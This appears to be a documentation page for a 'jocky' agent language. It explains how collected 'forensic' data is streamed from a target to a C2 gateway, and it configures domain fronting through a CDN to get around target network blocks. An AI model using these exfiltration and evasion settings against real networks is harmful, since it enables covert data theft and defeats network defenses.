# Transmit Directive

The `transmit` field specifies where collected and encrypted forensic data is sent.

---

## Syntax

```jocky
transmit via: "<endpoint>";
```

---

## Supported Endpoint Formats

| Format | Example | Notes |
|--------|---------|-------|
| WebSocket (unencrypted) | `ws://server:8080/telemetry` | Dev/local only |
| WebSocket (TLS) | `wss://server:8443/telemetry` | Production |
| HTTPS | `https://server:443/upload` | REST upload mode |

**Recommended for production:**
```jocky
transmit via: "wss://forensics-gw.ntro.gov.in/telemetry";
```

---

## How Transmission Works

1. The agent opens a TLS 1.3 WebSocket connection to the endpoint.
2. Both sides authenticate via mutual TLS (server cert + client cert).
3. Encrypted data packets are streamed as binary WebSocket frames.
4. Each frame includes: `session_id`, `sequence_number`, `ciphertext`, `aead_tag`.
5. The server writes each frame to the blockchain audit ledger.
6. The agent closes the connection and exits cleanly.

---

## Domain Fronting

If the target network blocks direct connections to the C2 server, you can route traffic through a CDN using **domain fronting**. This is configured server-side via the API — not in the `.jocky` source file.

```bash
curl -X POST http://localhost:8080/api/v1/sessions/<id>/domain-front \
  -d '{"enabled":true,"front_domain":"cdn.example.com","real_host":"forensics-gw.ntro.gov.in","backend_url":"https://origin.ntro.gov.in"}'
```

The agent's TLS SNI header will show `cdn.example.com` (the front domain) while the HTTP `Host:` header routes to `forensics-gw.ntro.gov.in`. See the [Domain Fronting](12-domain-fronting.md) chapter for details.

---

## Transmission in the Audit Ledger

Every transmission event is recorded in the blockchain ledger with:
- Session ID
- Timestamp
- Bytes transmitted
- SHA-256 hash of the encrypted payload
- Destination endpoint

This provides a complete chain-of-custody record for all data that left the target.

---

## Example

```jocky
// Development (local server, no TLS)
transmit via: "ws://localhost:8080/telemetry";

// Production (TLS, internal gateway)
transmit via: "wss://forensics-gw.ntro.gov.in/telemetry";

// Production (HTTPS upload mode)
transmit via: "https://forensics-gw.ntro.gov.in/api/v1/upload";
```
